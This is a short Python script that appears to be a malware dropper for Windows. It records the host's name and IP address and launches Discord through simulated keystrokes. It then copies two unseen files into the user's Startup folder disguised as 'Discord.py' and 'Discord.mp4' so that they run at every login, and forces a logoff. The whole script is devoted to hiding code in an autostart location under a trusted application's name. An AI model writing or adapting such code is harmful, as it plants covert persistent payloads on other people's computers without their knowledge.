import os
import socket
import subprocess
import random
import shutil
import pynput
import time
path =os.getcwd()
info2 = socket.gethostname()
info1 =socket.gethostbyname(info2)
k =pynput.keyboard.Controller()
enter =pynput.keyboard.Key.enter
login =os.getlogin()
print(info1 , info2 )
input()
cmd =subprocess.Popen("cmd.exe /K cd c:/")
time.sleep(0.2)
k.type("cd C:/Users/"+login+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Discord Inc/")
time.sleep(0.1)
k.press(enter)
time.sleep(0.1)
k.type("start discord")
time.sleep(0.1)
k.press(enter)
time.sleep(1)
cmd.terminate()
time.sleep(0.5)
cmd2 =subprocess.Popen("cmd.exe /K cd c:/")
time.sleep(0.5)
shutil.copy("mediaplayer.py" , "C:/Users/" + login + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Discord.py")
shutil.copy("info.settings" , "C:/Users/" + login + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Discord.mp4")
time.sleep(5)
os.system("shutdown -l")
time.sleep(1)
exit()